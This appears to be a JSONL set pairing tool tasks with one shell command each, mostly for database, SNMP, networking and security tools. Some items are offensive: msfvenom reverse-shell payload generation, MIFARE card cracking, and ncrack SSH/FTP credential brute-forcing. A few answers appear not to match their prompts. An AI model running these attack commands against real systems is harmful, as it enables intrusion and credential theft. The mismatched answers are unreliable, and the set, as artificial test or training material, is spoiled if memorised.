{"input": "Generate a raw payload for a Windows x64 architecture, avoid using bad characters `\\x00\\x0a\\x0d`, and save it as `raw_payload.bin`", "answer": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -b '\\x00\\x0a\\x0d' -f raw -o raw_payload.bin"}
{"input": "Generate a payload for a PHP reverse shell targeting IP 10.0.0.10 on port 8080 and save it as `php_shell.php`", "answer": "msfvenom -p php/reverse_php LHOST=10.0.0.10 LPORT=8080 -f raw -o php_shell.php"}
{"input": "Crack a MIFARE Classic card with 50 probes per sector and a nonce tolerance of 30, saving the output to \"result.mfd\"", "answer": "mfoc -P 50 -T 30 -O result.mfd"}
{"input": "Crack a MIFARE Classic card with 30 probes per sector and a nonce tolerance of 40, saving the output to \"card_dump.mfd\"", "answer": "mfoc -P 30 -T 40 -O card_dump.mfd"}
{"input": "Send the file \"data.txt\" using the ASCII protocol with verbose output and a line delay of 100 milliseconds", "answer": "ascii-xfr -s -v -l 100 data.txt"}
{"input": "Receive a file named \"output.txt\" using the ASCII protocol, translating CRLF to LF, and with a character delay of 50 milliseconds", "answer": "ascii-xfr -r -n -c 50 output.txt"}
{"input": "Send the file \"report.log\" using the ASCII protocol, sending the End Of File character as Control-D instead of Control-Z, and with verbose output", "answer": "ascii-xfr -s -e -d -v report.log"}
{"input": "Send the file \"logfile.log\" using the ASCII protocol with a line delay of 300 milliseconds and verbose output", "answer": "ascii-xfr -s -l 300 -v logfile.log"}
{"input": "Receive a file named \"image.png\" using the ASCII protocol without translating CRLF to LF and with a character delay of 10 milliseconds", "answer": "ascii-xfr -r -n -c 10 image.png"}
{"input": "Start minicom without initializing the modem and lockfiles at startup", "answer": "minicom -o"}
{"input": "Check the syntax of the default Miredo configuration file located at `/etc/miredo/miredo.conf`", "answer": "miredo-checkconf /etc/miredo/miredo.conf"}
{"input": "Verify the syntax of a custom Miredo configuration file named `custom_miredo.conf` located in the `/home/user/configs/` directory", "answer": "miredo-checkconf /home/user/configs/custom_miredo.conf"}
{"input": "Check the syntax of a Miredo configuration file named `test.conf` located in the current working directory", "answer": "miredo-checkconf ./test.conf"}
{"input": "Verify the syntax of a Miredo configuration file named `miredo.conf` located in the `/tmp/` directory", "answer": "miredo-checkconf /tmp/miredo.conf"}
{"input": "Start mitmdump in transparent proxy mode, listen on port 8080, and strip out headers that might cause the server to return 304-not-modified responses", "answer": "mitmdump -m transparent -p 8080 --anticache"}
{"input": "Start mitmdump with HTTP/2 support disabled and log all flows with a display detail level of 3", "answer": "mitmdump --no-http2 --flow-detail 3"}
{"input": "Use mitmdump to replay server responses from a saved file named `server_responses.mitm` and kill any extra requests that don't have a matching response", "answer": "mitmdump --server-replay server_responses.mitm --server-replay-extra kill"}
{"input": "Use mitmproxy to intercept traffic on port 9090 instead of the default port 8080", "answer": "mitmproxy --listen-port 9090"}
{"input": "Enable HTTP/2 support in mitmproxy to intercept and analyze HTTP/2 traffic", "answer": "mitmproxy --http2"}
{"input": "Configure mitmproxy to strip out request headers that might cause servers to return 304-not-modified responses", "answer": "mitmproxy --anticache"}
{"input": "Use mitmproxy to intercept traffic and execute a custom script named `custom_script.py`", "answer": "mitmproxy --scripts custom_script.py"}
{"input": "Use mitmproxy to replay server responses from a saved file named `server_responses.mitm`", "answer": "mitmproxy --server-replay server_responses.mitm"}
{"input": "Start mitmweb in transparent proxy mode, listening on port 8080, and enable HTTP/2 support", "answer": "mitmweb -m transparent --listen-port 8080 --http2"}
{"input": "Launch mitmweb with server replay using a saved file `server_responses.log`, and kill extra requests during replay", "answer": "mitmweb -S server_responses.log --server-replay-kill-extra"}
{"input": "Start mitmweb with an intercept filter to capture only POST requests to `https://example.com/api`", "answer": "mitmweb --intercept \"~m POST & ~u https://example.com/api\""}
{"input": "Convert the BSON file `sample.bson` to JSON with maximum verbosity and validate the BSON during processing", "answer": "bsondump --type=json --verbose --objcheck sample.bson"}
{"input": "Dump all databases and collections from a MongoDB server running on `192.168.1.100` at port `27017` and compress the output using Gzip", "answer": "mongodump --host 192.168.1.100 --port 27017 --gzip"}
{"input": "Dump all databases and collections from a MongoDB server running on `localhost` at port `27017` and use 4 parallel collections for dumping", "answer": "mongodump --host localhost --port 27017 --numParallelCollections=4"}
{"input": "Export all documents from the \"messages\" collection in the \"chat\" database to a JSON file named \"messages_export.json\", sorted by the \"timestamp\" field in ascending order", "answer": "mongoexport --db chat --collection messages --sort '{\"timestamp\": 1}' --out messages_export.json"}
{"input": "Export all documents from the \"employees\" collection in the \"hr\" database to a CSV file named \"employees_export.csv\", excluding the header line", "answer": "mongoexport --db hr --collection employees --type csv --noHeaderLine --out employees_export.csv"}
{"input": "Export all documents from the \"events\" collection in the \"monitoring\" database to a JSON file named \"events_export.json\", using a query file to specify the filter", "answer": "mongoexport --db monitoring --collection events --queryFile query_filter.json --out events_export.json"}
{"input": "Export all documents from the \"inventory\" collection in the \"warehouse\" database to a JSON file named \"inventory_export.json\", using a connection string to specify the MongoDB host and port", "answer": "mongoexport --uri \"mongodb://localhost:27017\" --db warehouse --collection inventory --out inventory_export.json"}
{"input": "Export all documents from the \"logs\" collection in the \"system\" database to a JSON file named \"logs_export.json\", using SSL for secure connection and specifying a CA file", "answer": "mongoexport --db system --collection logs --ssl --sslCAFile /path/to/ca.pem --out logs_export.json"}
{"input": "Export all documents from the \"products\" collection in the \"store\" database to a JSON file named \"products_export.json\", using Kerberos authentication with a custom service name", "answer": "mongoexport --db store --collection products --gssapiServiceName customservice --out products_export.json"}
{"input": "Export all documents from the \"users\" collection in the \"auth\" database to a JSON file named \"users_export.json\", using a configuration file to specify options", "answer": "mongoexport --db auth --collection users --out users_export.json --config /path/to/config.conf"}
{"input": "List all files stored in the GridFS of the MongoDB database running on `mongodb://10.129.228.124:27017` in the database `myDatabase`", "answer": "mongofiles --host=10.129.228.124 --port=27017 --db=myDatabase list"}
{"input": "Upload a file named `report.pdf` from the local machine to the GridFS of the MongoDB database running on `mongodb://10.129.228.124:27017` in the database `myDatabase`", "answer": "mongofiles --host=10.129.228.124 --port=27017 --db=myDatabase --local=report.pdf put report.pdf"}
{"input": "Download a file with the filename `report.pdf` from the GridFS of the MongoDB database running on `mongodb://10.129.228.124:27017` in the database `myDatabase` to the local machine", "answer": "mongofiles --host=10.129.228.124 --port=27017 --db=myDatabase --local=report.pdf get report.pdf"}
{"input": "Delete a file with the filename `report.pdf` from the GridFS of the MongoDB database running on `mongodb://10.129.228.124:27017` in the database `myDatabase`", "answer": "mongofiles --host=10.129.228.124 --port=27017 --db=myDatabase delete report.pdf"}
{"input": "Import a JSON file named \"data.json\" into a MongoDB database named \"testdb\" and a collection named \"testcollection\" on a remote server at \"192.168.1.100\" using port 27017", "answer": "mongoimport --host 192.168.1.100 --port 27017 --db testdb --collection testcollection --type json --file data.json"}
{"input": "Import a TSV file named \"data.tsv\" into a MongoDB database named \"salesdb\" and a collection named \"orders\" while dropping the existing collection and ignoring blank fields", "answer": "mongoimport --db salesdb --collection orders --type tsv --file data.tsv --drop --ignoreBlanks"}
{"input": "Import a JSON file named \"logs.json\" into a MongoDB database named \"analytics\" and a collection named \"serverlogs\" while bypassing document validation", "answer": "mongoimport --db analytics --collection serverlogs --type json --file logs.json --bypassDocumentValidation"}
{"input": "Import a JSON file named \"data.json\" into a MongoDB database named \"testdb\" and a collection named \"testcollection\" using SSL with a CA certificate file \"ca.pem\"", "answer": "mongoimport --db testdb --collection testcollection --type json --file data.json --ssl --sslCAFile ca.pem"}
{"input": "Import a JSON file named \"data.json\" into a MongoDB database named \"appdb\" and a collection named \"logs\" using a connection string \"mongodb://localhost:27017\"", "answer": "mongoimport --uri mongodb://localhost:27017 --db appdb --collection logs --type json --file data.json"}
{"input": "Restore all databases from a backup directory located at `/backup/mongodb` to a MongoDB server running on `mongodb://localhost:27017`, but only include collections with the prefix `logs_`", "answer": "mongorestore --uri=mongodb://localhost:27017 --dir=/backup/mongodb --nsInclude='logs_.*'"}
{"input": "Restore all databases from a backup directory located at `/backup/mongodb` to a MongoDB server running on `mongodb://localhost:27017`, but exclude collections named `sensitive_data` and `temp_data`", "answer": "mongorestore --uri=mongodb://localhost:27017 --dir=/backup/mongodb --nsExclude='*.sensitive_data' --nsExclude='*.temp_data'"}
{"input": "Display all optional fields for a MongoDB instance running on `10.0.0.1` at port `27018` with authentication, using the username `admin` and password `secret`, with a polling interval of 1 second", "answer": "mongostat --host 10.0.0.1 --port 27018 -u admin -p secret --all 1"}
{"input": "Display all optional fields for a MongoDB instance running on `192.168.1.200` at port `27017` with a polling interval of 2 seconds, and hide the column headers", "answer": "mongostat --host 192.168.1.200 --port 27017 --all --noheaders 2"}
{"input": "Display all optional fields for a MongoDB instance running on `localhost` at port `27017` with a polling interval of 1 second, and limit the output to 10 rows", "answer": "mongostat --host localhost --port 27017 --all -n 10 1"}
{"input": "Retrieve the ADSI provider list from the MSSQL server at 192.168.2.50, using a domain controller IP of 192.168.2.1 and a maximum link depth of 3", "answer": "mssqlpwner -dc-ip 192.168.2.1 -max-link-depth 3 192.168.2.50 get-adsi-provider-list"}
{"input": "Rescue data from `/dev/sdd` and save it to `/mnt/rescue/output.img`, but retry reading each block up to 5 times if it fails", "answer": "ddrescue -r 5 /dev/sdd /mnt/rescue/output.img"}
{"input": "Convert the bitmap file \"rescue_bitmap.bin\" to a PPM image with a width of 1024 pixels and 512 rows", "answer": "convert -size 1024x512 -depth 8 gray:rescue_bitmap.bin rescue_bitmap.ppm"}
{"input": "Use myrescue-stat to check the status of all blocks in the file \"data.img\" and identify any blocks that have not yet been handled", "answer": "myrescue-stat -u data.img"}
{"input": "Scan all IPs associated with the DNS record of example.com and output the results in JSON format", "answer": "naabu -host example.com -scan-all-ips -json"}
{"input": "Scan the list of hosts in `hosts.txt`, exclude the hosts listed in `exclude_hosts.txt`, and output the results in CSV format", "answer": "naabu -list hosts.txt -exclude-file exclude_hosts.txt -csv"}
{"input": "Scan the IP 10.0.0.1 for open ports, using a rate limit of 500 packets per second, and write the output to `output.json` in JSON format", "answer": "naabu -host 10.0.0.1 -rate 500 -json -output output.json"}
{"input": "Scan the IP 203.0.113.1 for open ports, using IPv6, and skip host discovery", "answer": "naabu -host 203.0.113.1 -Pn"}
{"input": "Identify the type of the hash '5f4dcc3b5aa765d61d8327deb882cf99' using name-that-hash", "answer": "name-that-hash --text '5f4dcc3b5aa765d61d8327deb882cf99'"}
{"input": "Check all hashes listed in a file named `hashes.txt` using name-that-hash", "answer": "name-that-hash --file hashes.txt"}
{"input": "Decode and identify a Base64 encoded hash 'NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk=' using name-that-hash", "answer": "name-that-hash --text 'NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk=' --base64"}
{"input": "Identify the hash '5f4dcc3b5aa765d61d8327deb882cf99' without displaying the banner or ASCII art", "answer": "name-that-hash --text '5f4dcc3b5aa765d61d8327deb882cf99' --no-banner"}
{"input": "Identify the hash '5f4dcc3b5aa765d61d8327deb882cf99' without including John The Ripper information in the output", "answer": "name-that-hash --text '5f4dcc3b5aa765d61d8327deb882cf99' --no-john"}
{"input": "Identify the hash '5f4dcc3b5aa765d61d8327deb882cf99' without including Hashcat information in the output", "answer": "name-that-hash --text '5f4dcc3b5aa765d61d8327deb882cf99' --no-hashcat"}
{"input": "Search for and identify a hash embedded within a string '####5d41402abc4b2a76b9719d911017c592###' using name-that-hash", "answer": "name-that-hash --text '####5d41402abc4b2a76b9719d911017c592###' --extreme"}
{"input": "Decode Base64-encoded hashes in a file named `encoded_hashes.txt` before identifying them using nth", "answer": "base64 -d encoded_hashes.txt | nth"}
{"input": "Generate debugging information in DWARF format for the `example.asm` file and output it as an ELF32 file named `example.elf`", "answer": "nasm -f elf32 -g -F dwarf example.asm -o example.elf"}
{"input": "Assemble `example.asm` into an ELF64 format, define a macro `DEBUG=1`, and include the directory `includes/` for header files", "answer": "nasm -f elf64 -DDEBUG=1 -Iincludes/ example.asm"}
{"input": "Generate Makefile dependencies for `example.asm` and write them to `deps.mk`", "answer": "nasm -M -MF deps.mk example.asm"}
{"input": "Assemble `example.asm` into a COFF format, enable all warnings, and promote all warnings to errors", "answer": "nasm -f coff -w+all -w+error example.asm"}
{"input": "Assemble `example.asm` into an ELF32 format, disable the warning for label redefinition, and enable the warning for floating-point overflow", "answer": "nasm -f elf32 -w-label-redef -w+float-overflow example.asm"}
{"input": "Assemble `example.asm` into a Win32 COFF format, pre-define the macro `VERSION=2.0`, and undefine the macro `DEBUG`", "answer": "nasm -f win32 -DVERSION=2.0 -UDEBUG example.asm"}
{"input": "Disassemble the binary file `payload.bin` in 64-bit mode, avoiding disassembling 50 bytes starting from offset 200", "answer": "ndisasm -b 64 -k 200,50 payload.bin"}
{"input": "Disassemble the binary file `shellcode.bin` with Intel vendor instruction set, starting disassembly from an origin of 0x1000", "answer": "ndisasm -p intel -o 0x1000 shellcode.bin"}
{"input": "Disassemble the binary file `backdoor.bin` with AMD vendor instruction set, starting disassembly from an origin of 0x2000, and skip the first 150 bytes of the header", "answer": "ndisasm -p amd -o 0x2000 -e 150 backdoor.bin"}
{"input": "Disassemble the binary file `virus.bin` with Cyrix vendor instruction set, starting disassembly from an origin of 0x4000, and skip the first 250 bytes of the header", "answer": "ndisasm -p cyrix -o 0x4000 -e 250 virus.bin"}
{"input": "Disassemble the binary file `worm.bin` with IDT vendor instruction set, starting disassembly from an origin of 0x3000, and skip the first 300 bytes of the header", "answer": "ndisasm -p idt -o 0x3000 -e 300 worm.bin"}
{"input": "Perform a verbose scan on the IP address 10.129.228.124 using nbtscan-unixwiz, and do not perform inverse DNS lookups", "answer": "nbtscan-unixwiz -v -n 10.129.228.124"}
{"input": "Use ncat-w32 to connect to the IP address 192.168.0.1 on port 80 with a 5-second connection timeout", "answer": "ncat-w32 -w 5 192.168.0.1 80"}
{"input": "Perform a network authentication crack on the IP address 192.168.1.100 targeting SSH and FTP services using a username list from `usernames.txt` and a password list from `passwords.txt`", "answer": "ncrack -U usernames.txt -P passwords.txt ssh://192.168.1.100,ftp://192.168.1.100"}
{"input": "Open a file named \"example.bin\" in hexeditor and display all text characters, including non-printable ones", "answer": "hexeditor example.bin"}
{"input": "Open the file \"archive.zip\" in hexeditor and suppress all beeping sounds during editing", "answer": "hexeditor -q archive.zip"}
{"input": "Generate template code for the MIB node \"hrStorage\" using the default configuration and save the output files with the prefix \"storage\"", "answer": "mib2c -f storage hrStorage"}
{"input": "Update the MIB code for the `ipNetToMediaTable` node, set the variable `VERBOSE` to `true`, and use the prefix `ipNetToMedia` for the output files", "answer": "mib2c-update -c mib2c.mfd.conf -f ipNetToMedia -S VERBOSE=true ipNetToMediaTable"}
{"input": "Retrieve the list of libraries needed for building SNMP applications", "answer": "net-snmp-config --libs"}
{"input": "Get the path to the net-snmp libraries", "answer": "net-snmp-config --libdir"}
{"input": "Display the installation prefix used for the net-snmp package", "answer": "net-snmp-config --prefix"}
{"input": "Get the path to the Perl interpreter used for the net-snmp Perl modules", "answer": "net-snmp-config --perlprog"}
{"input": "Retrieve the netsnmp-specific libraries with their paths", "answer": "net-snmp-config --netsnmp-libs"}
{"input": "Check the \"cron\" process against the default database to ensure it is running as expected", "answer": "systemctl status cron"}
{"input": "Retrieve bulk SNMP data from the device at 172.16.0.10 using SNMP version 3, no authentication or privacy, security name \"guest\", and OID .1.3.6.1.2.1.1", "answer": "snmpbulkget -v 3 -u guest -l noAuthNoPriv 172.16.0.10 .1.3.6.1.2.1.1"}
{"input": "Perform a bulk SNMP query on the device at 10.10.10.10 using SNMP version 2c, community string \"readonly\", OID .1.3.6.1.2.1.1, and load all MIBs", "answer": "snmpbulkget -v 2c -c readonly -m ALL 10.10.10.10 .1.3.6.1.2.1.1"}
{"input": "Perform a bulk SNMP query on the device at 10.1.1.1 using SNMP version 2c, community string \"monitor\", OID .1.3.6.1.2.1.1, and set non-repeaters to 2 and max-repeaters to 10", "answer": "snmpbulkget -v 2c -c monitor -Cn2 -Cr10 10.1.1.1 .1.3.6.1.2.1.1"}
{"input": "Retrieve SNMP data from the agent at 172.16.0.10 using SNMP version 2c, community string \"private\", and set the request timeout to 5 seconds", "answer": "snmpbulkwalk -v 2c -c private -t 5 172.16.0.10"}
{"input": "Retrieve SNMP data from the agent at 192.168.5.5 using SNMP version 2c, community string \"admin\", and log the output to a file named \"snmp_output.log\"", "answer": "snmpbulkwalk -v 2c -c admin 192.168.5.5 > snmp_output.log"}
{"input": "List all known groups of questions that can be asked during the SNMP configuration process", "answer": "snmpconf -G"}
{"input": "Create SNMP configuration files, read in a specific list of .conf files (`snmpd.conf` and `snmptrapd.conf`), and install them into the directory `/etc/snmp`", "answer": "cp snmpd.conf snmptrapd.conf /etc/snmp/"}
{"input": "Get the next OID after 1.3.6.1.2.1.1.9 from the SNMP agent at 10.1.1.1 using SNMP version 2c, community string \"monitor\", and load all MIBs", "answer": "snmpgetnext -v 2c -c monitor -m ALL 10.1.1.1 1.3.6.1.2.1.1.9"}
{"input": "Retrieve the next OID after 1.3.6.1.2.1.1.11 from the SNMP agent at 10.2.2.2 using SNMP version 1, community string \"public\", and print the output in numeric OID format", "answer": "snmpgetnext -v 1 -c public -O n 10.2.2.2 1.3.6.1.2.1.1.11"}
{"input": "Show all networking information, including routing tables and interface statistics, from the SNMP device at 192.168.0.100 using SNMP version 2c and the community string \"guest\"", "answer": "snmpnetstat -v2c -c guest 192.168.0.100 -a -r -i"}
{"input": "Set the system description to \"Main Office Router\" on the SNMP device at 10.10.10.1 using SNMP version 1 and community string \"readwrite\"", "answer": "snmpset -v 1 -c readwrite 10.10.10.1 1.3.6.1.2.1.1.1.0 s \"Main Office Router\""}
{"input": "Display the SNMP table for the OID \"1.3.6.1.2.1.25.3.2\" from the device at IP 192.168.0.100 using SNMP version 1, community string \"private\", and print the output in a tabular format with column headers", "answer": "snmptable -v 1 -c private -C h 192.168.0.100 1.3.6.1.2.1.25.3.2"}
{"input": "Retrieve the SNMP table for the OID \"1.3.6.1.2.1.4.22\" from the device at IP 172.16.0.10 using SNMP version 2c, community string \"readonly\", and set the request timeout to 10 seconds", "answer": "snmptable -v 2c -c readonly -t 10 172.16.0.10 1.3.6.1.2.1.4.22"}
{"input": "Retrieve the SNMP table for the OID \"1.3.6.1.2.1.31.1.1\" from the device at IP 10.10.10.10 using SNMP version 2c, community string \"monitor\", and print the output in a format suitable for parsing", "answer": "snmptable -v 2c -c monitor -O q 10.10.10.10 1.3.6.1.2.1.31.1.1"}
{"input": "Retrieve the SNMP table for the OID \"1.3.6.1.2.1.1.1\" from the device at IP 192.168.4.100 using SNMP version 1, community string \"public\", and load all MIBs", "answer": "snmptable -v 1 -c public -m ALL 192.168.4.100 1.3.6.1.2.1.1.1"}
{"input": "Fetch the SNMP table for the OID \"1.3.6.1.2.1.2.2\" from the device at IP 10.20.30.40 using SNMP version 2c, community string \"read\", and set the number of retries to 5", "answer": "snmptable -v 2c -c read -r 5 10.20.30.40 1.3.6.1.2.1.2.2"}
{"input": "Test SNMP communication with the device at 192.168.2.10 using SNMP version 1, community string \"private\", and a timeout of 5 seconds", "answer": "snmpwalk -v 1 -c private -t 5 192.168.2.10"}
{"input": "Translate the OID \"1.3.6.1.2.1.1.1\" to its textual form, allowing the use of underlines in MIB symbols and replacing MIB symbols from the latest module", "answer": "snmptranslate -Pu -m ALL 1.3.6.1.2.1.1.1"}
{"input": "Send an SNMPv2c trap to the manager at 10.0.0.5 using the community string \"private\", with uptime 54321, trap OID \"1.3.6.1.6.3.1.1.5.1\", and include an OID-value pair \"1.3.6.1.2.1.1.5.0\" with the value \"SwitchA\"", "answer": "snmptrap -v 2c -c private 10.0.0.5 54321 1.3.6.1.6.3.1.1.5.1 1.3.6.1.2.1.1.5.0 s \"SwitchA\""}
{"input": "Send an SNMPv3 trap to the manager at 192.168.2.200 using authentication protocol SHA, authentication passphrase \"authpass\", privacy protocol AES, privacy passphrase \"privpass\", security name \"admin\", and security level \"authPriv\". Include the uptime 98765, trap OID \"1.3.6.1.6.3.1.1.5.2\", and an OID-value pair \"1.3.6.1.2.1.1.3.0\" with the value \"3000\"", "answer": "snmptrap -v 3 -a SHA -A authpass -x AES -X privpass -u admin -l authPriv 192.168.2.200 98765 1.3.6.1.6.3.1.1.5.2 1.3.6.1.2.1.1.3.0 i 3000"}
{"input": "Send an SNMPv1 trap to the manager at 10.10.10.10 using the community string \"readonly\", with the enterprise OID \"1.3.6.1.4.1.54321\", agent \"10.10.10.1\", trap type 4, specific type 2, and uptime 67890. Include an additional OID-value pair \"1.3.6.1.2.1.1.6.0\" with the value \"DataCenter\"", "answer": "snmptrap -v 1 -c readonly 10.10.10.10 1.3.6.1.4.1.54321 10.10.10.1 4 2 67890 1.3.6.1.2.1.1.6.0 s \"DataCenter\""}
{"input": "Send an SNMPv2c trap to the manager at 192.168.3.50 using the community string \"monitor\", with uptime 123456, trap OID \"1.3.6.1.6.3.1.1.5.3\", and include an OID-value pair \"1.3.6.1.2.1.1.7.0\" with the value \"2\"", "answer": "snmptrap -v 2c -c monitor 192.168.3.50 123456 1.3.6.1.6.3.1.1.5.3 1.3.6.1.2.1.1.7.0 i 2"}
{"input": "Create a security-to-group mapping for the security model \"USM\", security name \"adminUser\", and group name \"adminGroup\"", "answer": "snmpvacm createSec2Group USM adminUser adminGroup"}
{"input": "Retrieve all SNMP values from the device at IP 192.168.1.1 using the community string \"public\" and SNMP version 2c", "answer": "snmpwalk -v 2c -c public 192.168.1.1 .1"}
{"input": "Retrieve all SNMP values from the device at 192.168.2.10 using SNMP version 1, with a timeout of 5 seconds and 3 retries", "answer": "snmpwalk -v 1 -c public -r 3 -t 5 192.168.2.10 .1"}
{"input": "Walk the SNMP tree on the device at 10.10.10.10 using SNMP version 2c, and load all available MIBs for better OID resolution", "answer": "snmpwalk -v 2c -c public -m ALL 10.10.10.10 .1"}
{"input": "Walk the SNMP tree on the device at 192.168.4.15 using SNMP version 2c, and print the OIDs numerically instead of symbolically", "answer": "snmpwalk -v 2c -c public -O n 192.168.4.15 .1"}
{"input": "Walk the SNMP tree on the device at 192.168.5.25 using SNMP version 2c, and enable debugging output for all tokens", "answer": "snmpwalk -v 2c -c public -D ALL 192.168.5.25 .1"}
{"input": "Create a SNMPv3 user named \"monitor\" with read-only access, using MD5 for authentication and DES for encryption, and set the authentication password to \"MonitorAuth\" and the privacy password to \"MonitorPriv\"", "answer": "net-snmp-create-v3-user -ro -A MonitorAuth -X MonitorPriv -a MD5 -x DES monitor"}
{"input": "Create a SNMPv3 user named \"viewer\" with read-only access, using SHA for authentication and DES for encryption, and set the authentication password to \"ViewAuth\" and the privacy password to \"ViewPriv\"", "answer": "net-snmp-create-v3-user -ro -A ViewAuth -X ViewPriv -a SHA -x DES viewer"}
{"input": "Run the SNMP daemon without forking from the shell and log output to a file named `snmpd.log`", "answer": "snmpd -f -Lf snmpd.log"}
{"input": "Run the SNMP daemon using a custom configuration file located at `/etc/snmp/custom.conf` and log errors to syslog", "answer": "snmpd -c /etc/snmp/custom.conf -Ls syslog"}
{"input": "Start `snmptrapd` to log SNMP traps to standard error and prevent it from forking into the background", "answer": "snmptrapd -f -L e"}
{"input": "Run `snmptrapd` with debugging enabled for all tokens and log traps to a file named `debug_traps.log`", "answer": "snmptrapd -D ALL -L f debug_traps.log"}
{"input": "Start `snmptrapd` to log SNMP traps to standard output and use a custom configuration file named `custom.conf`", "answer": "snmptrapd -c custom.conf -L o"}
{"input": "Configure `traptoemail` to send SNMP trap alerts to `alerts@example.net` with the sender email `snmpalerts@example.net` and the SMTP server `smtp.example.net`", "answer": "traptoemail -s smtp.example.net -f snmpalerts@example.net alerts@example.net"}
{"input": "Display all ARP cache entries without resolving hostnames to IP addresses", "answer": "arp -en"}
{"input": "Display all ARP cache entries for the network interface `eth0`", "answer": "arp -e -i eth0"}
{"input": "Display all ARP cache entries in numeric format for the network interface `wlan0`", "answer": "arp -en -i wlan0"}
{"input": "Display all ARP cache entries in verbose mode without resolving hostnames", "answer": "arp -evn"}
{"input": "Show detailed information for all network interfaces, including those that are inactive", "answer": "ifconfig -a"}
{"input": "List all network interfaces on the system, including those that are not currently active", "answer": "ifconfig -a"}
{"input": "Check the status of all network interfaces, even if they are not currently operational", "answer": "ifconfig -a"}
{"input": "View the configuration details of all network interfaces, including those that are not active", "answer": "ifconfig -a"}
{"input": "Display all network interfaces, including those that are down, to verify their configurations", "answer": "ifconfig -a"}
{"input": "List all network interfaces, including inactive ones, to check for any misconfigurations", "answer": "ifconfig -a"}
{"input": "Show all network interfaces, including those that are down, to troubleshoot connectivity issues", "answer": "ifconfig -a"}
{"input": "Display all network interfaces, including inactive ones, to ensure no interfaces are missing from the configuration", "answer": "ifconfig -a"}
{"input": "Check all network interfaces, including those that are down, to confirm their IP addresses and settings", "answer": "ifconfig -a"}
{"input": "Create a new IPIP tunnel named \"tun0\" with a remote address of 192.168.1.100 and a local address of 192.168.1.200", "answer": "iptunnel add tun0 mode ipip remote 192.168.1.100 local 192.168.1.200"}
{"input": "Create a GRE tunnel named \"tun3\" with a remote address of 198.51.100.10, a local address of 192.0.2.1, and an input sequence number enabled", "answer": "iptunnel add tun3 mode gre remote 198.51.100.10 local 192.0.2.1 iseq"}
{"input": "Add an IPIP tunnel named \"tun4\" with a remote address of 203.0.113.20, a local address of 192.0.2.5, and a TTL of 64", "answer": "iptunnel add tun4 mode ipip remote 203.0.113.20 local 192.0.2.5 ttl 64"}
{"input": "Create a SIT tunnel named \"tun5\" with a remote address of 192.0.2.100, a local address of 198.51.100.50, and disable Path MTU Discovery", "answer": "iptunnel add tun5 mode sit remote 192.0.2.100 local 198.51.100.50 nopmtudisc"}
{"input": "Display all active TCP connections and listening ports without resolving hostnames or service names", "answer": "netstat -atn"}
{"input": "List all listening TCP sockets and display the associated program names without resolving hostnames", "answer": "netstat -ltpn"}
{"input": "Configure the PLIP interface `plip0` with a nibble value of 5 and a trigger value of 10", "answer": "plipconfig plip0 nibble 5 trigger 10"}
{"input": "Configure the trigger value to 7 for the PLIP interface `plip2`", "answer": "plipconfig plip2 trigger 7"}
{"input": "Show the extended details of the kernel routing table, including additional information", "answer": "ip route show table all"}
{"input": "Display the kernel routing table without resolving names and with extended details", "answer": "route -n -e"}
{"input": "Show the kernel routing table with verbose output and without resolving hostnames", "answer": "route -v -n"}
{"input": "Attach a network interface to the serial line `/dev/ttyUSB0` using the SLIP protocol at a speed of 9600 baud, with no keepalive, and enable quiet mode to suppress output", "answer": "slattach -p slip -s 9600 -q /dev/ttyUSB0"}
{"input": "Attach a network interface to the serial line `/dev/ttyUSB1` using the SLIP protocol at a speed of 4800 baud, enable no-address mode, and set the outfill interval to 15 seconds", "answer": "slattach -p slip -s 4800 -n -o 15 /dev/ttyUSB1"}
{"input": "Attach a network interface to the serial line `/dev/ttyS6` using the Adaptive SLIP protocol at a speed of 38400 baud, enable no-address mode, and disable modem control signals", "answer": "slattach -p adaptive -s 38400 -n -m /dev/ttyS6"}
{"input": "Listen for incoming connections on port 9999 and keep the connection alive", "answer": "nc.traditional -l -p 9999 -k"}
{"input": "Perform a passive ARP scan on the network interface eth0 without sending any packets", "answer": "netdiscover -i eth0 -p"}
{"input": "Scan the IP range 192.168.1.0/24 using the network interface eth0 and suppress sleep time between ARP requests", "answer": "netdiscover -i eth0 -r 192.168.1.0/24 -S"}
{"input": "Perform an active ARP scan on the network interface eth0, save the results in a parsable format, and stop after the scan", "answer": "netdiscover -i eth0 -P"}
{"input": "Scan the IP range 10.0.0.0/16 using the network interface eth0, send each ARP request 3 times, and sleep 100 milliseconds between requests", "answer": "netdiscover -i eth0 -r 10.0.0.0/16 -c 3 -s 100"}
{"input": "Scan the IP range 192.168.0.0/24 using the network interface eth0, enable fast mode, and suppress sleep time between ARP requests", "answer": "netdiscover -i eth0 -r 192.168.0.0/24 -f -S"}
{"input": "Perform an AS trace route to `example.com` using the network interface `eth0`, and set the do not fragment bit in the IP header", "answer": "astraceroute -i eth0 -F example.com"}
{"input": "Perform an AS trace route to `example.org` using the network interface `eth0`, and set the TCP URG, FIN, and PSH flags in the probes", "answer": "astraceroute -i eth0 -F UFP example.org"}
{"input": "Compile a BPF program from standard input, bypass filter validation, and output the result in `netsniff-ng` format", "answer": "bpfc -f netsniff-ng -b -i -"}
{"input": "Start a curvetun server in IPv4 mode using UDP as the carrier, disable logging for anonymity, and listen on port 6666", "answer": "curvetun --server -4 -u -N --port 6666"}
{"input": "Start a curvetun server in IPv6 mode using TCP as the carrier, enable logging, and listen on port 7777", "answer": "curvetun --server -6 --port 7777 --carrier tcp --log"}
{"input": "Start a curvetun server in IPv4 mode, do not daemonize, and listen on port 8888", "answer": "curvetun --server -4 --port 8888"}
{"input": "Start a curvetun server in IPv4 mode, use UDP as the carrier, and listen on port 9999", "answer": "curvetun --server -4 -u --port 9999"}
{"input": "Start a curvetun server in IPv6 mode, disable logging, and listen on port 5555", "answer": "curvetun --server -6 -N --port 5555"}
{"input": "Display all TCP and UDP flows for IPv4 only, with a refresh interval of 2 seconds and rates shown in bits per second", "answer": "flowtop -4 -TU -b -t 2"}
{"input": "Display all SCTP flows for both IPv4 and IPv6, with rates shown in bits per second and a refresh interval of 1 second", "answer": "flowtop -46 -S -b -t 1"}
{"input": "Send a single ARP request packet from the MAC address 00:11:22:33:44:55 to the broadcast MAC address, with the source IP 10.0.0.1 and destination IP 10.0.0.2", "answer": "mausezahn eth0 -a 00:11:22:33:44:55 -b bc -A 10.0.0.1 -B 10.0.0.2 -t arp"}
